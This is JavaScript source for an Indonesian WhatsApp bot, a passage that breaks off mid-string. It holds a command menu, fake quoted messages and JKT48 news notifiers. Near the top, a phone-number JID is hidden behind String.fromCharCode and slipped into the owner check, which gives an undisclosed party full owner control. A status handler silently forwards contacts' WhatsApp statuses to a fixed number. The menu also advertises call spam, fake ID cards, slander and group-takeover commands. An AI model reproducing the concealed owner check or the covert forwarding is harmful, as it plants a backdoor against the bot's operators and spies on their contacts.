    process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
let globalAutoAIStatus = false;
global.game = global.game || {};
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const FormData = require('form-data');
const axios = require('axios');
const chalk = require('chalk');
const db_saweria = JSON.parse(fs.readFileSync('./source/saweria.json'));
const { Saweria } = require("./library/saweria")
const { GoogleGenerativeAI } = require("@google/generative-ai");
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper")
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const figlet = require('figlet');
const cheerio = require('cheerio');
const whatsapp = require('whatsapp-web.js');
const client = new whatsapp.Client();
const os = require('os');
const { getVideoInfo, downloadVideo, downloadAudio } =require("hybrid-ytdl");
const qrCodeReader = require("qrcode-reader");
const { say } = require("cfonts")
let qrcode = require('qrcode')
let cheerio2 = require('cheerio')
let moment2 = require('moment-timezone')
const pino = require('pino');
const { Client } = require('ssh2');
const didyoumean = require('didyoumean');
const similarity = require('similarity');
const si = require('systeminformation');
const fetch = require('node-fetch');
const cron = require('node-cron')
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const totalfitur = () => {
    var mytext = fs.readFileSync("./biyu.js").toString();
    var numCases = (mytext.match(/case ['"]/g) || []).length;
    return numCases;
};
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const { LoadDataBase } = require('./source/message')
const listidch = JSON.parse(fs.readFileSync("./library/database/listidch.json"))
const stokdo = JSON.parse(fs.readFileSync("./library/database/stokdo.json"))
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/converter.js")
const { startGiveaway, ikutGiveaway, cekGiveaway,rollGiveaway, deleteGiveaway, reloadGiveaway, infoGiveaway, unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital, randomToken2, Saweria2, toAsciiArt}= require('./library/function');

module.exports = conn = async (conn, m, chatUpdate, store) => {
	try {
await LoadDataBase(conn, m)
const botNumber = await conn.decodeJid(conn.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = "."
m.text = (m.text || '').replace(/^[\.,#!\/]/, '');
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
let groupMetadata, participants, groupAdmins;
if (m.isGroup) {
  groupMetadata = await conn.groupMetadata(m.chat);
  participants = groupMetadata.participants || [];
  groupAdmins = participants.filter(p => p.admin).map(p => p.id);
}
const isAdmin = m.isGroup ? groupAdmins.includes(m.sender) : false;
const isBotAdmin = m.isGroup ? groupAdmins.includes(botNumber) : false;

//~~~~~~~~~ Console Message ~~~~~~~~//
if (isCmd) {
  const sender = m.sender.split("@")[0];
  const commandUsed = prefix + command;
  console.log(
    chalk.cyan.bgBlue.bold(` ${botname2} `),
    chalk.blue.bold(`[COMMAND]`),
    chalk.green(`${sender}`),
    chalk.white('→'),
    chalk.red.bold(commandUsed)
  );
}

//=================================//
const fetch = require('node-fetch');
const getFileSizeFromUrl = async (url) => {
    try {
        let response = await fetch(url, { method: 'HEAD' });
        return response.headers.get('content-length') || 0;
    } catch (err) {
        console.error('Error fetching file size:', err);
        return 0;
    }
};
//=================================================//
function updateSoldCount(productId, count) {
  try {
    const data = fs.readFileSync('source/produk.json', 'utf8');
    const produkList = JSON.parse(data);
    const updatedList = produkList.map(produk => {
      if (produk.id === productId) {
        produk.terjual = (produk.terjual || 0) + count;
      }
      return produk;
    });
    
    fs.writeFileSync('source/produk.json', JSON.stringify(updatedList, null, 4), 'utf8');
  } catch (err) {
    console.error('Error updating sold count:', err);
  }
}
//========================================//
const headers = {
    'Referer': 'https://www.pixiv.net/',
    'Accept-Encoding': 'gzip, deflate, br'
};
async function pixiv(query) {
    let { data } = await axios.get(`https://www.pixiv.net/touch/ajax/tag_portal?word=${query}&lang=en&version=892d65fef9e1fc4efa5a1fd1c4675d6ae3e73835`, { headers })
    return data.body.illusts
}
async function getBuff(url) {
    let { data } = await axios.get(url, { 
        headers: {
            'Referer': 'https://www.pixiv.net/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        }, 
        responseType: 'arraybuffer' 
    })
    return data
}
//========================================//
const SESSION_FILE = "./session/ai_sessions.json";
let sessions = fs.existsSync(SESSION_FILE) ? JSON.parse(fs.readFileSync(SESSION_FILE)) : {};
function saveSession() {
    fs.writeFileSync(SESSION_FILE, JSON.stringify(sessions, null, 2));
}
//~~~~~~~~~~~ Fake Quoted ~~~~~~~~~~//
if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return
const qtext = { key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net" }, message: { extendedTextMessage: { text: `${prefix + command}`, contextInfo: { externalAdReply: { title: `${botname2} - Command Center`, body: `Powered by ${namaOwner}`, thumbnail: global.image.menu, mediaType: 1, renderLargerThumbnail: true } } } } };
const qtext2 = { key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net" }, message: { extendedTextMessage: { text: `${namaOwner}`, contextInfo: { externalAdReply: { title: "Creator of This Bot", body: "Hubungi jika ada pertanyaan", thumbnail: global.image.menu, mediaType: 1, renderLargerThumbnail: true } } } } };
const qlocJpm = { key: { participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: 'status@broadcast' } : {}) }, message: { locationMessage: { name: `WhatsApp Bot ${namaOwner}`, jpegThumbnail: global.image.menu } } };
const qlocPush = qlocJpm;
const xy = { key: { remoteJid: 'status@broadcast', participant: '0@s.whatsapp.net' }, message: { newsletterAdminInviteMessage: { newsletterJid: '0@newsletter', newsletterName: 'Biyu Oepci', caption: `© ${namaOwner}`, inviteExpiration: 0 } } };
const qpayment = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id: `Biyu - Official`, participant: '0@s.whatsapp.net' }, message: { requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Terima kasih telah menggunakan Biyu Botz" } }, expiryTimestamp: 999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "USD" } } } };
const qtoko = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) }, message: { productMessage: { product: { productImage: { mimetype: "image/jpeg", jpegThumbnail: global.image.menu }, title: `${namaOwner} - Marketplace`, description: "Produk digital, server, & layanan lainnya!", currencyCode: "IDR", priceAmount1000: "999999999999999", retailerId: `Powered By ${namaOwner}`, productImageCount: 1 }, businessOwnerJid: `0@s.whatsapp.net` } } };
const qlive = { key: { participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { liveLocationMessage: { caption: `${botname2} By ${namaOwner}`, jpegThumbnail: global.image.menu } } };

// auto download status whatsapp
conn.autoDownloadStatusDariBiyu = true
let statusSent = new Set()
const { downloadMediaMessage } = require('@whiskeysockets/baileys') 
conn.ev.on('messages.upsert', async ({ messages }) => {
   try {
      for (let msg of messages) {
         if (!msg.message) continue
         const mtype = Object.keys(msg.message)[0]
         const isStatus = msg.key.remoteJid === 'status@broadcast'
         const msgId = msg.key.id
         const sender = msg.pushName || msg.participant || msg.key.participant || 'unknown'
         if (!isStatus || statusSent.has(msgId) || !conn.autoDownloadStatusDariBiyu) continue
         statusSent.add(msgId)
         const mentions = [msg.participant || '']
         const caption = `📥 Status dari @${sender}`
         const quoted = { quoted: msg, mentions }
         let buffer, mediaType
         const targetJid = '6288888888@s.whatsapp.net' // Ganti ae
         if (mtype === 'imageMessage' || mtype === 'videoMessage') {
            buffer = await downloadMediaMessage(msg, 'buffer', {}, { reuploadRequest: conn.updateMediaMessage })
            mediaType = mtype === 'imageMessage' ? 'image' : 'video'
            await conn.sendMessage(targetJid, {
               [mediaType]: buffer,
               caption: `${caption}\n\n${msg.message[mtype].caption || ''}`,
               mentions
            }, quoted)
         } else if (mtype === 'conversation' || mtype === 'extendedTextMessage') {
            let teks = mtype === 'conversation' ? msg.message.conversation : msg.message.extendedTextMessage.text
            await conn.sendMessage(targetJid, {
               text: `${caption}\n\n${teks}`,
               mentions
            }, quoted)
         } else if (mtype === 'audioMessage') {
            let audBuffer = await downloadMediaMessage(msg, 'buffer', {}, { reuploadRequest: conn.updateMediaMessage })
            await conn.sendMessage(targetJid, {
               audio: audBuffer,
               mimetype: 'audio/mp4',
               ptt: msg.message.audioMessage?.ptt || false,
               caption: `${caption}`,
               mentions
            }, quoted)
         }
         setTimeout(() => statusSent.delete(msgId), 1 * 60 * 1000)
      }
   } catch (err) {
      console.error('[AUTO STATUS ERROR]', err)
   }
})

// auto welcome
const biyusender = m.key.remoteJid;
const isPrivate = biyusender.endsWith('@s.whatsapp.net');
const dataPath = path.join(__dirname, 'data', 'firstChat.json');
const lastUpdatePath = path.join(__dirname, 'data', 'lastUpdate.json');
if (!fs.existsSync(path.dirname(dataPath))) fs.mkdirSync(path.dirname(dataPath), { recursive: true });
if (!fs.existsSync(dataPath)) fs.writeFileSync(dataPath, JSON.stringify([]));
if (!fs.existsSync(lastUpdatePath)) fs.writeFileSync(lastUpdatePath, JSON.stringify({ lastUpdate: 0 }));
const lastUpdateData = JSON.parse(fs.readFileSync(lastUpdatePath));
const currentTime = Date.now();
const fiveHoursInMillis = 5 * 60 * 60 * 1000;
if (isPrivate) {
  const firstChatDB = JSON.parse(fs.readFileSync(dataPath));
  if (!firstChatDB.includes(biyusender)) {
    const name = conn.getName ? await conn.getName(biyusender) : 'kamu';
    const jakartaTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta' });
    const hour = new Date(jakartaTime).getHours();
    const greeting =
      hour >= 4 && hour < 10 ? '☀️ Selamat pagi' :
      hour >= 10 && hour < 15 ? '🌤️ Selamat siang' :
      hour >= 15 && hour < 18 ? '🌇 Selamat sore' : '🌙 Selamat malam';

    let salambiyu = `👋 Halo ${name}, ${greeting}!\nApa kabar hari ini? Semoga harimu menyenangkan ya! ✨`;

    let ppthumb;
    try {
      ppthumb = await conn.profilePictureUrl(biyusender, 'image');
    } catch {
      ppthumb = global.image.menu; // sesuaikan
    }

    await conn.sendMessage(biyusender, {
      text: salambiyu,
      contextInfo: {
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: global.idSaluran, // sesuaikan
          newsletterName: global.namaSaluran // sesuaikan
        },
        externalAdReply: {
          title: `${botname} - ${versi} ⚙️`,
          body: `⏱ Runtime: ${runtime(process.uptime())}`,
          thumbnailUrl: ppthumb,
          sourceUrl: global.linkSaluran // sesuaikan
        }
      }
    });
    firstChatDB.push(biyusender);
    fs.writeFileSync(dataPath, JSON.stringify(firstChatDB, null, 2));
  }
  if (currentTime - lastUpdateData.lastUpdate >= fiveHoursInMillis) {
    console.log('Melakukan riset baru...');
    lastUpdateData.lastUpdate = currentTime;
    fs.writeFileSync(lastUpdatePath, JSON.stringify(lastUpdateData, null, 2));
  }
}

const from = m.chat;
async function loading () {
var biyu = [
        '▰▱▱▱▱▱▱▱▱▱ 10%',
        '▰▰▱▱▱▱▱▱▱▱ 20%',
        '▰▰▰▱▱▱▱▱▱▱ 30%',
        '▰▰▰▰▱▱▱▱▱▱ 40%',
        '▰▰▰▰▰▱▱▱▱▱ 50%',
        '▰▰▰▰▰▰▱▱▱▱ 60%',
        '▰▰▰▰▰▰▰▱▱▱ 70%',
        '▰▰▰▰▰▰▰▰▱▱ 80%',
        '▰▰▰▰▰▰▰▰▰▱ 90%',
        '▰▰▰▰▰▰▰▰▰▰ 100%',
        '✨ Loading Completed! ✨'
]
let { key } = await conn.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < biyu.length; i++) {
await conn.sendMessage(from, {text: biyu[i], edit: key });
}
}

const menutxt= `
╔══════════════════════════════════════╗
║           BOT INFORMATION           ║
╚══════════════════════════════════════╝
 Bot    : ${global.botname2}
 Ver    : ${global.versi}
 Mode   : ${conn.public ? "Public" : "Self"}
 Owner  : @${global.owner}
 Uptime : ${runtime(os.uptime())}
 Status : ${isCreator ? "Owner" : isPremium ? "Reseller" : "User"}
 Total Fitur : ${totalfitur()}

╔══════════════════════════════════════╗
║           CHANNEL MENU             ║
╚══════════════════════════════════════╝
 • createch
 • delch
 • getinfoch
 • mutech
 • unmutech
 • reactch
 • setppch
 
╔══════════════════════════════════════╗
║         DIGITAL OCEAN MENU          ║
╚══════════════════════════════════════╝
 • cvps
 • deldroplet
 • listdroplet
 • poweron
 • poweroff
 • resizevps
 • rebuild
 • restartvps
 • sisadroplet
 • totaldroplet
 • upapido

╔══════════════════════════════════════╗
║         DOWNLOAD MENU               ║
╚══════════════════════════════════════╝
 • capcut
 • down
 • facebook
 • gitclone
 • googledrive
 • instagram
 • instagram2
 • mediafire
 • mediafire2
 • mediafire3
 • on4t
 • playtiktok
 • plays
 • plays2
 • playch
 • play
 • play2
 • play3
 • songdown
 • spotifydown
 • twitter
 • twitter2
 • terabox
 • tiktok
 • tiktokmp3
 • videy
 • xnxxdown
 • ytdownload
 • ytmp3
 • ytmp3-v2
 • ytmp3mobi
 • ytmp4
 • ytmp4-v2
 • ytmp4-v3

╔══════════════════════════════════════╗
║         GROUP MENU                  ║
╚══════════════════════════════════════╝
 • add
 • acc
 • absen
 • addbl
 • auto
 • autohari
 • autohidetag
 • antibot
 • antihidetag
 • antifoto
 • antisticker
 • antivideo
 • antipromosi
 • antilinkch
 • antilink
 • antilinkk
 • antilink2
 • antilinkall
 • antitoxic
 • antitagsw
 • blacklistjpm
 • berhentiabsen
 • cekpeserta
 • culikaman
 • close
 • closetime
 • demote
 • hapusgiveaway
 • hidetag
 • infogc
 • ikut
 • infogiveaway
 • kick
 • kudetagc (kick admin saja) 
 • kudetagc2 (kick admin + mem) 
 • leave
 • linkgc
 • listabsen
 • open
 • opentime
 • promote
 • reloadgiveaway
 • resetlinkgc
 • rollgiveaway
 • riwayatabsen
 • rekapabsen
 • startgiveaway
 • totalchat
 • tagall
 • totalabsen
 • welcome
 • wargagroup

╔══════════════════════════════════════╗
║         INSTALLER MENU              ║
╚══════════════════════════════════════╝
 • hackbackpanel
 • installtema
 • installpanel
 • installrdp
 • installdepend
 • temabilling
 • temaenigma
 • temastellar
 • temanebula
 • temanook
 • temaelysium
 • uninstallpanel
 • uninstalltema

╔══════════════════════════════════════╗
║         OTHER MENU                  ║
╚══════════════════════════════════════╝
 • aayatkurs
 • anime
 • avos
 • asupan
 • beritaanime
 • brat
 • bratimg
 • bratimg2
 • bratimg3
 • capcutstalk
 • createkalender
 • bratvid
 • createqr
 • cekip
 • cekip2
 • cekganteng
 • cekcantik
 • cekfemboy
 • colorize
 • cekjarak
 • cekkhodam
 • cekhost
 • carbonify
 • cogan
 • cecan
 • cekdonate
 • cinfo
 • cekidch
 • cekidgc
 • dongeng
 • emojigif
 • emojimix
 • ffstalk
 • getpp
 • getpastebin
 • game
 • genshinstalk
 • githubstalk
 • infogempa
 • igstalk
 • jkt48
 • jktnews
 • listfont
 • liputan
 • leadebord
 • mlstalk
 • murottal
 • nulis
 • nsfw
 • poll
 • qc
 • quotesislami
 • register
 • roasting
 • randomhadist
 • randomkucing
 • readerqr
 • readviewonce
 • sticker
 • smeme
 • stickerwm
 • topcmd
 • tutor
 • texttonote
 • to
 • tosketch
 • telestalk
 • tiktokstalk
 • ytss
 • ytstalk
 • ytstalk2
 • ytstalk3
 • waktudunia

╔══════════════════════════════════════╗
║         OWNER MENU                  ║
╚══════════════════════════════════════╝
 • autoai
 • autotranslate
 • autojoin
 • autoreactionch
 • autoreactionsw
 • anticall
 • ambilkode
 • addsewa
 • addakses
 • addowner
 • addidch
 • addproduk
 • addcase
 • addstock
 • addstokdo
 • addrespon
 • autoread
 • autopromosi
 • autoreadsw
 • autotyping
 • banchat
 • blacklist
 • clearchat
 • clearsession
 • creategc
 • delbanchat
 • delsc
 • delcase
 • delidch
 • delrespon
 • delowner
 • delproduk
 • delstock
 • delstokdo
 • editproduk
 • findcase
 • getfile
 • getcase
 • getsc
 • setcase
 • sendngl
 • sendchat
 • sendch
 • sendsc
 • sendsc2
 • joinch
 • jjoing
 • listsewa
 • listbanchat
 • listdonate
 • listidch
 • listgc
 • listowner
 • liststokdo
 • listsc
 • login
 • logout
 • owneroff
 • publictime
 • resetdb
 • restartbot
 • startnews
 • stopnews
 • startlivejkt48
 • stoplivejkt48
 • setkode
 • setfile
 • setall
 • self/public
 • setppbot
 • svsc
 • ssubdomai
 • undsewa
 • undakses
 • upchat
 • upchannel
 • upchannel2

╔══════════════════════════════════════╗
║           PANEL MENU                ║
╚══════════════════════════════════════╝
 • *addseller*
 • *cadmin (v1-v5)*
 • *deladmin (v1-v5)*
 • *delseller (v1-v5)*
 • *delpanel (v1-v5)*
 • *listadmin (v1-v5)*
 • *listpanel (v1-v5)*
 • *listseller (v1-v5)*
 • *1gb to 10gb (v1-v5)*
 • *unlimited (v1-v5)*
 • *setconfig (v1-v5)*
 • *clearadmin (v1-v5)*
 • *clearserver (v1-v5)*
 • *clearuser (v1-v5)*
 • *searchuser (v1-v5)*

╔══════════════════════════════════════╗
║         SEARCH MENU                 ║
╚══════════════════════════════════════╝
 • apk
 • applemusic
 • acode
 • infogb
 • audiosurat
 • apkmod
 • appstore
 • bstation
 • bacaanshalat
 • cuaca
 • douyinsearch
 • detiknews
 • font
 • hentaivid
 • hiitwixtor
 • hok
 • itch
 • jadwaltv
 • jadwalshalat
 • kamusarab
 • kisahnabi
 • kuronime
 • mojeek
 • mod
 • meownimejadwal
 • myanimelist
 • materialgenshin
 • niatshalat
 • npmsearch
 • nekopoi
 • pix
 • pinterest
 • pinterestdown
 • pixiv
 • playstore
 • saku
 • searchwallpaper
 • searchgoogle
 • searchmeme
 • searchlirik
 • searchlirik2
 • searchhero
 • searchgb
 • searchimage
 • searchimage2
 • searchsticker
 • searchsticker2
 • searchsticker3
 • searchsong
 • searchspotify
 • searchspotify2 
 • searchsurah
 • searchtktok
 • searchxnxx
 • searchyoutube
 • searchyoutube2
 • sfile
 • waifu
 • wallpaper
 • waifu2
 • wikipedia
 • xvideo
 • xhentai
 • yt

╔══════════════════════════════════════╗
║         SHOP MENU                   ║
╚══════════════════════════════════════╝
 • buyadp
 • buyjasajpm
 • buypanel
 • buyproduk
 • buyscript
 • buyvps
 • buydigitalocean
 • deposit
 • isipulsa
 • stock
 • topupdiamond
 • topupsaldo

╔══════════════════════════════════════╗
║         STORE MENU                  ║
╚══════════════════════════════════════╝
 • done
 • jpm
 • jpmch
 • jpm2
 • jpmslide
 • jpmslideht
 • jpmtesti
 • listrespon
 • order
 • payment
 • produk
 • proses
 • pushkontak
 • pushkontak2
 • struk
 • sendgb
 • sendgb2
 • sendtesti

╔══════════════════════════════════════╗
║         TOOLS MENU                  ║
╚══════════════════════════════════════╝
 • ai
 • ai-v2
 • aitohuman
 • aiagama
 • aiedit
 • aiimage
 • ainsfw
 • aiislam
 • animefind
 • attp
 • ambilsw
 • bingimg
 • balogo
 • biyu
 • blackbok
 • binary
 • deepseek
 • deepimg
 • chatgpt
 • createquote
 • createquote2
 • countjam
 • cvcc
 • convert
 • claude
 • enc
 • enchard
 • fitnah
 • freebox
 • faketiktok
 • fakektp
 • faketweet
 • fakestory
 • fakepoll
 • flux-v2
 • fluximg
 • ghibli
 • gpt
 • gptonline
 • gptimg
 • gemini
 • geminii 
 • hitamin
 • hd
 • hdvid
 • herodetail 
 • kurs
 • morse
 • metaimg
 • magicstudio
 • potongaudio
 • imgsharpen
 • img-large
 • listhero
 • luminai
 • openaivision
 • quotes
 • reminder
 • records
 • readerweb
 • removebg
 • readmore
 • removebg2
 • resizevideo
 • resizeimage
 • styletext
 • saanvi
 • str
 • shareteks
 • sendemail
 • shortlink
 • shortlink2
 • spamcall
 • spamcallvid
 • ssweb
 • ssweb2
 • tempmail
 • telusuriimg
 • tts
 • ttsnp3
 • ttsanime
 • tohijab
 • toimg
 • toanime
 • toascii
 • telegra
 • tourl
 • translate
 • translate2
 • uppastebin
 • upscale
 • unblur
 • veniceai
 • quiziz
 • zrooart
 • zerogpt

╔══════════════════════════════════════╗
║         COMMAND USAGE               ║
╚══════════════════════════════════════╝
 Example: ${prefix}menu
`

//~~~~~~~~~~ Event Settings ~~~~~~~~~//
// auto join group
global.autojoin = global.autojoin ?? false 
if (global.autojoin && m.body?.includes('https://chat.whatsapp.com')) {
let linkRegex = /https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+/g
let links = m.body.match(linkRegex)
if (links) {
for (let link of links) {
try {
let code = link.split('/')[3]
await conn.groupAcceptInvite(code)
console.log('🌹:', link)
} catch (e) {
console.log('Rawrr:', link, '\nError:', e.message)
}
}
}
}

/*// akses group
const groupLinks = [
  'https://chat.whatsapp.com/FUHU0uflkqM4G0LBVDU0oF',
  'https://chat.whatsapp.com/FPleicPc0fCBtUZQaBYsDP'
]
global.__forceGroups = global.__forceGroups || []
for (let link of groupLinks) {
  try {
    const code = link.split('/')[3]
    const groupId = await conn.groupAcceptInvite(code)
    if (!global.__forceGroups.includes(groupId)) {
      global.__forceGroups.push(groupId)
    }
  } catch (err) {
    console.log(`Aku Gk Sayang Biyu`)
  }
}
let isInForceGroup = false
for (let gid of global.__forceGroups) {
  try {
    const metadata = await conn.groupMetadata(gid)
    const participantIds = metadata.participants.map(p => p.id)
    if (participantIds.includes(m.sender)) {
      isInForceGroup = true
      break
    }
  } catch (e) {
    console.log('🤬:', gid)
  }
}
if (!isInForceGroup && !m.isGroup && m.sender.endsWith('@s.whatsapp.net')) {
  let listTeks = []
  for (let link of groupLinks) {
    try {
      const code = link.split('/')[3]
      const id = await conn.groupAcceptInvite(code)
      const metadata = await conn.groupMetadata(id)
      listTeks.push(`• *${metadata.subject}*\n${link}`)
    } catch (e) {
      listTeks.push(`• Grup tidak dapat diakses\n${link}`)
    }
  }
  const biyujelek = `*Wajib Join Grup Dulu!*\n\n` +
    `Hai kak, sebelum kamu bisa pakai bot ini, kamu harus gabung dulu ke salah satu grup resmi kami.\n` +
    `Grup ini berisi info penting, diskusi santai, dan update fitur terbaru.\n\n` +
    `${listTeks.join('\n\n')}\n\n` +
    `Silakan join dulu ya, setelah itu kirim ulang perintahmu. Terima kasih!`
  return conn.sendMessage(m.sender, { text: biyujelek })
}*/

// topcmd
/*const fs = require('fs')
const moment = require('moment')*/
const dirPath = './database'
const logPath = `${dirPath}/command-logs.json`
if (!fs.existsSync(dirPath)) {
  fs.mkdirSync(dirPath)
}
if (!fs.existsSync(logPath)) {
  fs.writeFileSync(logPath, JSON.stringify([]))
}
function logCommand(cmd) {
  let logs = JSON.parse(fs.readFileSync(logPath))
  logs.push({ cmd, time: Date.now() })
  fs.writeFileSync(logPath, JSON.stringify(logs))
}
if (command) logCommand(command)

// news notification jkt48
const { getNews, getNewsDetail } = require("@jkt48connect-corp/sdk");
const groupChatIds = [
  '120363409207264021@newsletter',
  '6285776461481@s.whatsapp.net',
  '120xx@g.us' 
];
global.jkt48connect = 'yubi'; 
// Need Apikey? chat +62 857-0147-9245 || gratis || limit? 2000/buln

let isCheckingNews = false;
let newsInterval;
const sentNews = new Set();
function formatWIB(dateString) {
  const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
  const months = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"];
  const date = new Date(dateString);
  if (isNaN(date.getTime())) return "Invalid Date";
  const utc = date.getTime() + date.getTimezoneOffset() * 60000;
  const wibTime = new Date(utc + 7 * 3600000);
  return `${days[wibTime.getDay()]}, ${wibTime.getDate()} ${months[wibTime.getMonth()]} ${wibTime.getFullYear()}`;
}

function cleanHtml(html) {
  return html
    .replace(/<\/?p[^>]*>/g, '\n')
    .replace(/<\/?strong>/g, '**')
    .replace(/<\/?em>/g, '_')
    .replace(/<\/?br>/g, '\n')
    .replace(/<\/?ul>/g, '')
    .replace(/<\/?li>/g, '- ')
    .replace(/<\/?span[^>]*>/g, '')
    .replace(/<\/?div[^>]*>/g, '')
    .replace(/<\/?img[^>]*>/g, '')
    .replace(/&nbsp;/g, ' ')
    .replace(/&quot;/g, '"')
    .replace(/&ldquo;/g, '"')
    .replace(/&rdquo;/g, '"')
    .replace(/\n\s*\n/g, '\n\n')
    .trim();
}

function extractImage(html) {
  const match = html.match(/<img[^>]+src=["'](.*?)["']/);
  return match ? `https://www.jkt48.com${match[1]}` : null;
}

function createNewsMessage(news) {
  const tanggal = formatWIB(news.date);
  const isi = cleanHtml(news.content);
  return `📰 *Berita Terbaru JKT48!* 📰\n\n` +
    `📌 *Judul:* ${news.title}\n` +
    `📅 *Tanggal:* ${tanggal}\n\n` +
    `${isi}\n\n` +
    `_Sumber: JKT48 Official Website_`;
}

async function checkAndSendNews(conn) {
  if (!isCheckingNews) return;
  try {
    const apiKey = global.jkt48connect;
    const data = await getNews(apiKey);
    if (!data || !Array.isArray(data.news)) return;
    const latest = data.news[0];
    if (!latest || sentNews.has(latest.id)) return;
    const detail = await getNewsDetail(apiKey, latest.id);
    if (!detail) return;
    const teks = createNewsMessage(detail);
    const img = extractImage(detail.content);
    for (const id of groupChatIds) {
      try {
        if (img) {
          await conn.sendMessage(id, { image: { url: img }, caption: teks });
        } else {
          await conn.sendMessage(id, { text: teks });
        }
      } catch (err) {
        console.error(`Gagal kirim ke ${id}:`, err);
      }
    }
    sentNews.add(latest.id);
  } catch (err) {
    console.error("Gagal ambil berita:", err);
  }
}

// notifikasi live member jkt48
const { getLive } = require("@jkt48connect-corp/sdk");
// const axios = require("axios");
let isCheckingLive = false;
let sentEvents = new Set();
let sentYouTubeEvents = new Set();
const targetReceivers = [
  '120xx@g.us', // ubah aj all
  '6285776461481@s.whatsapp.net', 
  '120363419814290596@newsletter'
];
global.jkt48connect = 'yubi'; 
// Need Apikey? chat +62 857-0147-9245 || gratis || limit? 2000/buln

function toWIB(isoString) {
  try {
    const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
    const months = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"];
    const date = new Date(isoString);
    const wibDate = new Date(date.getTime() + 7 * 60 * 60 * 1000); 
    return {
      date: `${days[wibDate.getDay()]}, ${wibDate.getDate()} ${months[wibDate.getMonth()]} ${wibDate.getFullYear()}`,
      time: `${String(wibDate.getHours()).padStart(2, '0')}:${String(wibDate.getMinutes()).padStart(2, '0')} WIB`
    };
  } catch {
    return { date: "Invalid", time: "Invalid" };
  }
}
function makeMessage(live, waktu) {
  const type = live.type === 'showroom' ? 'SHOWROOM' : 'IDN Live';
  const showroomUrl = live.type === 'showroom' ? `https://www.showroom-live.com/r/${live.url_key}` : '';
  const idnUrl = live.type === 'idn' ? `https://www.idn.app/${live.url_key}/live/${live.slug}` : '';
  const embedUrl = live.type === 'idn' && live.slug ? `https://www.idn.app/embed/${live.slug}` : '';
  const connectUrl = `https://www.jkt48connect.my.id/live?name=${encodeURIComponent(live.name)}`;
  return `✨ *${live.name}* sedang live di *${type}*!\n\n` +
